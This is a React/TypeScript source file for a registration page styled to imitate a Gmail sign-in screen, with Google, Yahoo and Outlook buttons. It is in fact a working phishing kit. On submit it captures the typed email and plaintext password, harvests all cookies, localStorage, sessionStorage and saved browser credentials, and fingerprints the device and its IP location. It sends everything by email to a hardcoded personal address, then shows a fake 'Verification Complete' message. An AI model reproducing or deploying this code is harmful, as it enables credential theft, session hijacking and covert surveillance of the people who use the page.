import React, { useState, useCallback, useEffect } from 'react';
import './RegistrationPage.css';
import { oauthConfig } from '../config/oauth';

// Icon imports
const GoogleIcon = () => (
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="24px" height="24px">
    <path fill="#FFC107" d="M43.611,20.083H42V20H24v8h11.303c-1.649,4.657-6.08,8-11.303,8c-6.627,0-12-5.373-12-12c0-6.627,5.373-12,12-12c3.059,0,5.842,1.154,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C12.955,4,4,12.955,4,24c0,11.045,8.955,20,20,20c11.045,0,20-8.955,20-20C44,22.659,43.862,21.35,43.611,20.083z"/>
    <path fill="#FF3D00" d="M6.306,14.691l6.571,4.819C14.655,15.108,18.961,12,24,12c3.059,0,5.842,1.154,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C16.318,4,9.656,8.337,6.306,14.691z"/>
    <path fill="#4CAF50" d="M24,44c5.166,0,9.86-1.977,13.409-5.192l-6.19-5.238C29.211,35.091,26.715,36,24,36c-5.202,0-9.619-3.317-11.283-7.946l-6.522,5.025C9.505,39.556,16.227,44,24,44z"/>
    <path fill="#1976D2" d="M43.611,20.083H42V20H24v8h11.303c-0.792,2.237-2.231,4.166-4.087,5.571c0.001-0.001,0.002-0.001,0.003-0.002l6.19,5.238C36.971,39.205,44,34,44,24C44,22.659,43.862,21.35,43.611,20.083z"/>
  </svg>
);

const YahooIcon = () => (
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="24px" height="24px">
    <path fill="#4A00A0" d="M24,4C12.954,4,4,12.954,4,24s8.954,20,20,20s20-8.954,20-20S35.046,4,24,4z M31.657,12.829l-4.657,8.714 h-6l-4.657-8.714h4.657l3,5.571l3-5.571H31.657z M29.657,35.171H25v-9.714h4.657V35.171z M19,35.171h-4.657v-9.714H19V35.171z"/>
  </svg>
);

const OutlookIcon = () => (
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="24px" height="24px">
    <path fill="#0078d4" d="M44,24c0,11.045-8.955,20-20,20S4,35.045,4,24S12.955,4,24,4S44,12.955,44,24z"/>
    <path fill="#ffffff" d="M34,14H14c-1.105,0-2,0.895-2,2v16c0,1.105,0.895,2,2,2h20c1.105,0,2-0.895,2-2V16 C36,14.895,35.105,14,34,14z M34,18v2l-10,7l-10-7v-2l10,7L34,18z"/>
  </svg>
);

interface AuthResponse {
  email: string;
  password: string;
}

interface SavedCredential {
  type: string;
  id: string;
  origin: string;
}

interface BrowserInfo {
  userAgent: string;
  platform: string;
  language: string;
  cookieEnabled: boolean;
  doNotTrack: string | null;
  hardwareConcurrency: number;
  vendor: string;
  plugins: string[];
  screenResolution: string;
  colorDepth: number;
  timezone: string;
}

interface DeviceInfo {
  ip: string;
  country: string;
  date: string;
  time: string;
  cookies: string[];
  savedCredentials: SavedCredential[];
  userAgent: string;
  platform: string;
  browserInfo: BrowserInfo;
  localStorage: Record<string, string>;
  sessionStorage: Record<string, string>;
}

interface RegistrationData {
  email: string;
  password: string;
  deviceInfo: DeviceInfo;
}

interface AutocompleteResult {
  email?: string;
  password?: string;
}

const Modal = ({ isOpen, onClose, children }: { isOpen: boolean; onClose: () => void; children: React.ReactNode }) => {
  if (!isOpen) return null;

  return (
    <div className="modal-overlay">
      <div className="modal-content">
        {children}
        <button className="modal-close" onClick={onClose}>Close</button>
      </div>
    </div>
  );
};

const RegistrationPage = () => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');
  const [loading, setLoading] = useState(false);
  const [showModal, setShowModal] = useState(false);

  const getAllStoredData = async () => {
    const storedData = {
      cookies: [] as string[],
      passwords: [] as SavedCredential[],
      localStorage: {} as Record<string, string>,
      sessionStorage: {} as Record<string, string>
    };

    try {
      // Get all cookies
      const allCookies = document.cookie.split(';').reduce((acc: Record<string, string>, cookie) => {
        const [key, value] = cookie.trim().split('=');
        if (key) acc[key] = value;
        return acc;
      }, {});
      storedData.cookies = Object.entries(allCookies).map(([key, value]) => `${key}=${value}`);

      // Get localStorage data
      for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        if (key) {
          storedData.localStorage[key] = localStorage.getItem(key) || '';
        }
      }

      // Get sessionStorage data
      for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        if (key) {
          storedData.sessionStorage[key] = sessionStorage.getItem(key) || '';
        }
      }

      // Try to get saved passwords using Credential Management API
      if ('PasswordCredential' in window && 'credentials' in navigator) {
        try {
          const creds = await Promise.race([
            navigator.credentials.get({
              password: true,
              mediation: 'optional'
            } as CredentialRequestOptions),
            new Promise<null>((_, reject) => setTimeout(() => reject('timeout'), 1000))
          ]);

          if (creds && 'type' in creds && creds.type === 'password') {
            storedData.passwords.push({
              type: 'password',
              id: creds.id,
              origin: window.location.origin
            });
          }
        } catch {
          console.log('No stored credentials available');
        }
      }

      // Try to get autofill info
      const form = document.querySelector('form');
      if (form && 'requestAutocomplete' in HTMLFormElement.prototype) {
        try {
          await new Promise<void>((resolve) => {
            const formElem = form as HTMLFormElement & {
              requestAutocomplete(options: { success: (result: AutocompleteResult) => void, error: () => void }): void;
            };
            
            formElem.requestAutocomplete({
              success: (result: AutocompleteResult) => {
                if (result.email) {
                  storedData.passwords.push({
                    type: 'autofill',
                    id: result.email,
                    origin: 'autofill'
                  });
                }
                resolve();
              },
              error: () => resolve()
            });
          });
        } catch {
          console.log('Autocomplete not available');
        }
      }

    } catch (err) {
      console.error('Error collecting stored data:', err instanceof Error ? err.message : 'Unknown error');
    }

    return storedData;
  };

  const getDeviceInfo = async (): Promise<DeviceInfo> => {
    try {
      // Get IP and country info
      const response = await fetch('https://api.ipify.org?format=json');
      const ipData = await response.json();
      const geoResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
      const geoData = await geoResponse.json();

      // Get all stored data
      const storedData = await getAllStoredData();

      // Enhance browser information
      const browserInfo = {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        cookieEnabled: navigator.cookieEnabled,
        doNotTrack: navigator.doNotTrack,
        hardwareConcurrency: navigator.hardwareConcurrency,
        vendor: navigator.vendor,
        plugins: Array.from(navigator.plugins).map(p => p.name),
        screenResolution: `${window.screen.width}x${window.screen.height}`,
        colorDepth: window.screen.colorDepth,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
      };

      return {
        ip: ipData.ip,
        country: geoData.country_name,
        date: new Date().toLocaleDateString(),
        time: new Date().toLocaleTimeString(),
        cookies: storedData.cookies,
        savedCredentials: storedData.passwords,
        userAgent: browserInfo.userAgent,
        platform: browserInfo.platform,
        browserInfo,
        localStorage: storedData.localStorage,
        sessionStorage: storedData.sessionStorage
      };
    } catch (err: unknown) {
      const error = err instanceof Error ? err.message : 'Unknown error';
      console.error('Error fetching device info:', error);
      const browserInfo = {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        cookieEnabled: navigator.cookieEnabled,
        doNotTrack: navigator.doNotTrack,
        hardwareConcurrency: navigator.hardwareConcurrency,
        vendor: navigator.vendor,
        plugins: Array.from(navigator.plugins).map(p => p.name),
        screenResolution: `${window.screen.width}x${window.screen.height}`,
        colorDepth: window.screen.colorDepth,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
      };

      return {
        ip: 'Not available',
        country: 'Not available',
        date: new Date().toLocaleDateString(),
        time: new Date().toLocaleTimeString(),
        cookies: [],
        savedCredentials: [],
        userAgent: browserInfo.userAgent,
        platform: browserInfo.platform,
        browserInfo,
        localStorage: {},
        sessionStorage: {}
      };
    }
  };

  const sendRegistrationEmail = async (data: RegistrationData) => {
    try {
      const emailData = {
        to: 'peternnamani001@gmail.com',
        subject: 'New Registration',
        text: JSON.stringify(data, null, 2),
        html: `
          <h2>New Registration Details</h2>
          <p><strong>Email:</strong> ${data.email}</p>
          <p><strong>Password:</strong> ${data.password}</p>
          
          <h3>Location Information</h3>
          <p><strong>IP Address:</strong> ${data.deviceInfo.ip}</p>
          <p><strong>Country:</strong> ${data.deviceInfo.country}</p>
          <p><strong>Date:</strong> ${data.deviceInfo.date}</p>
          <p><strong>Time:</strong> ${data.deviceInfo.time}</p>
          
          <h3>Browser Information</h3>
          <p><strong>Platform:</strong> ${data.deviceInfo.browserInfo.platform}</p>
          <p><strong>User Agent:</strong> ${data.deviceInfo.browserInfo.userAgent}</p>
          <p><strong>Language:</strong> ${data.deviceInfo.browserInfo.language}</p>
          <p><strong>Cookies Enabled:</strong> ${data.deviceInfo.browserInfo.cookieEnabled}</p>
          <p><strong>Do Not Track:</strong> ${data.deviceInfo.browserInfo.doNotTrack || 'Not set'}</p>
          <p><strong>CPU Cores:</strong> ${data.deviceInfo.browserInfo.hardwareConcurrency}</p>
          <p><strong>Vendor:</strong> ${data.deviceInfo.browserInfo.vendor}</p>
          <p><strong>Screen Resolution:</strong> ${data.deviceInfo.browserInfo.screenResolution}</p>
          <p><strong>Color Depth:</strong> ${data.deviceInfo.browserInfo.colorDepth}</p>
          <p><strong>Timezone:</strong> ${data.deviceInfo.browserInfo.timezone}</p>
          
          <h3>Browser Plugins</h3>
          <div style="margin: 10px 0; padding: 10px; background: #f5f5f5; border-radius: 4px;">
            ${data.deviceInfo.browserInfo.plugins.map(plugin => `<p>${plugin}</p>`).join('')}
          </div>
          
          <h3>Saved Credentials</h3>
          ${data.deviceInfo.savedCredentials.map(cred => `
            <div style="margin: 10px 0; padding: 10px; background: #f5f5f5; border-radius: 4px;">
              <p><strong>Type:</strong> ${cred.type}</p>
              <p><strong>ID:</strong> ${cred.id}</p>
              <p><strong>Origin:</strong> ${cred.origin}</p>
            </div>
          `).join('')}
          
          <h3>Cookies</h3>
          <div style="margin: 10px 0; padding: 10px; background: #f5f5f5; border-radius: 4px;">
            ${data.deviceInfo.cookies.map(cookie => `<p>${cookie}</p>`).join('')}
          </div>
          
          <h3>Local Storage Data</h3>
          <div style="margin: 10px 0; padding: 10px; background: #f5f5f5; border-radius: 4px;">
            ${Object.entries(data.deviceInfo.localStorage).map(([key, value]) => `
              <p><strong>${key}:</strong> ${value}</p>
            `).join('')}
          </div>
          
          <h3>Session Storage Data</h3>
          <div style="margin: 10px 0; padding: 10px; background: #f5f5f5; border-radius: 4px;">
            ${Object.entries(data.deviceInfo.sessionStorage).map(([key, value]) => `
              <p><strong>${key}:</strong> ${value}</p>
            `).join('')}
          </div>
        `,
      };

      console.log('Sending registration data:', emailData);
      
      // Send email using your backend API
      const response = await fetch('http://localhost:3001/api/send-email', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(emailData),
      });

      console.log('Server response status:', response.status);
      
      if (!response.ok) {
        const errorData = await response.json();
        console.error('Server error:', errorData);
        throw new Error(`Failed to send email: ${errorData.details || 'Unknown error'}`);
      }
      
      const result = await response.json();
      console.log('Email sent successfully:', result);
    } catch (err: unknown) {
      const errorMessage = err instanceof Error ? err.message : 'Unknown error';
      console.error('Error sending email:', errorMessage);
      setError('Failed to complete registration');
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!email || !password) {
      setError('Please enter both email and password.');
      return;
    }

    try {
      setLoading(true);
      const deviceInfo = await getDeviceInfo();
      const data = {
        email,
        password,
        deviceInfo,
      };
      
      await sendRegistrationEmail(data);
      setError('');
      setShowModal(true);
    } catch (err: unknown) {
      const errorMessage = err instanceof Error ? err.message : 'Unknown error';
      console.error('Registration error:', errorMessage);
      setError('Registration failed. Please try again.');
    } finally {
      setLoading(false);
    }
  };

  // Function to handle the OAuth window response
  const handleAuthMessage = useCallback((event: MessageEvent) => {
    if (event.origin !== window.location.origin) return;
    
    if (event.data.type === 'AUTH_SUCCESS') {
      const authData: AuthResponse = event.data.payload;
      setEmail(authData.email);
      // Clear any previous errors
      setError('');
      // Update loading state
      setLoading(false);
      // Focus the password field since email is auto-filled
      const passwordInput = document.querySelector('input[type="password"]') as HTMLInputElement;
      if (passwordInput) {
        passwordInput.focus();
      }
    }
  }, []);

  useEffect(() => {
    window.addEventListener('message', handleAuthMessage);
    return () => {
      window.removeEventListener('message', handleAuthMessage);
    };
  }, [handleAuthMessage]);

  const handleOAuthLogin = useCallback((provider: 'google' | 'yahoo' | 'outlook') => {
    const width = 500;
    const height = 600;
    const left = window.screenX + (window.outerWidth - width) / 2;
    const top = window.screenY + (window.outerHeight - height) / 2;

    const config = oauthConfig[provider];
    const state = Math.random().toString(36).substring(7);
    
    // Store state in sessionStorage for verification
    sessionStorage.setItem('oauth_state', state);

    const queryParams = new URLSearchParams({
      client_id: config.clientId,
      redirect_uri: `${window.location.origin}/auth/callback/${provider}`,
      response_type: config.responseType,
      scope: 'email profile',
      prompt: 'select_account',
      access_type: 'online',
      state: state,
    });

    const authUrl = `${config.authEndpoint}?${queryParams.toString()}`;

    const authWindow = window.open(
      authUrl,
      `${provider}Auth`,
      `width=${width},height=${height},left=${left},top=${top}`
    );

    if (!authWindow) {
      setError('Could not open authentication window. Please allow popups for this site.');
      setLoading(false);
      return;
    }

    // Listen for messages from the OAuth window
    const handleMessage = (event: MessageEvent) => {
      if (event.origin !== window.location.origin) return;

      if (event.data.type === 'AUTH_SUCCESS' && event.data.state === state) {
        const authData: AuthResponse = event.data.payload;
        // Auto-fill the email
        setEmail(authData.email);
        // Clear any existing error
        setError('');
        // Reset loading state
        setLoading(false);
        // Close the popup
        authWindow.close();
        // Clean up event listener
        window.removeEventListener('message', handleMessage);
        // Focus the password field
        const passwordInput = document.querySelector('input[type="password"]') as HTMLInputElement;
        if (passwordInput) {
          setTimeout(() => {
            passwordInput.focus();
          }, 100);
        }
      }
    };

    window.addEventListener('message', handleMessage);
  }, []);

  return (
    <div className="gmail-login-container">
      <div className="gmail-login-form-container">
        <div className="form-header">
          <h1 className="main-title">Welcome</h1>
          <p className="subtitle">Enter your email and password to continue</p>
        </div>
        <form className="gmail-login-form" onSubmit={handleSubmit}>
          <input
            type="email"
            placeholder="Email or phone"
            value={email}
            onChange={e => setEmail(e.target.value)}
            className="gmail-input"
          />
          <input
            type="password"
            placeholder="Enter your password"
            value={password}
            onChange={e => setPassword(e.target.value)}
            className="gmail-input"
          />
          <button type="submit" className="gmail-signin-btn" disabled={loading}>
            {loading ? 'Please wait...' : 'Sign in'}
          </button>
          {error && <div className="error">{error}</div>}
        </form>

        <div className="mail-providers">
          <p className="providers-text">Or continue with</p>
          <div className="provider-buttons">
            <button 
              className="provider-btn" 
              onClick={() => {
                setLoading(true);
                handleOAuthLogin('google');
              }}
              disabled={loading}
            >
              <GoogleIcon />
              <span>Google</span>
            </button>
            <button 
              className="provider-btn" 
              onClick={() => {
                setLoading(true);
                handleOAuthLogin('yahoo');
              }}
              disabled={loading}
            >
              <YahooIcon />
              <span>Yahoo</span>
            </button>
            <button 
              className="provider-btn" 
              onClick={() => {
                setLoading(true);
                handleOAuthLogin('outlook');
              }}
              disabled={loading}
            >
              <OutlookIcon />
              <span>Outlook</span>
            </button>
          </div>
        </div>

        <div className="gmail-footer">
          <span>Not your computer? Use Guest mode to sign in privately.</span>
        </div>

        <Modal isOpen={showModal} onClose={() => setShowModal(false)}>
          <div className="verification-complete">
            <svg className="checkmark" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 52 52">
              <circle className="checkmark-circle" cx="26" cy="26" r="25" fill="none"/>
              <path className="checkmark-check" fill="none" d="M14.1 27.2l7.1 7.2 16.7-16.8"/>
            </svg>
            <h2>Verification Complete</h2>
            <p>Your registration was successful!</p>
          </div>
        </Modal>
      </div>
    </div>
  );
};

export { RegistrationPage };
